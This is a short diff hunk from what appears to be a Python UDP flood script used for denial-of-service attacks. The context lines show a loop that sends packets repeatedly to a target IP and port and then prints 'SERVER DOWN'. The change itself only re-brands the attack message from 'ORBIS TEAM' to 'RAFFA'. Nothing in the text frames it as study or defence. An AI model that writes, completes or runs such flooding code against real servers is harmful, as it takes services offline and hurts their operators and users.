@@ -29,7 +29,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" ORBIS TEAM DDOS ATTACK!!!")
+			print(i +" DDOS BY RAFFA!!!")
 		except:
 			print("[!] SERVER DOWN!!!")
 
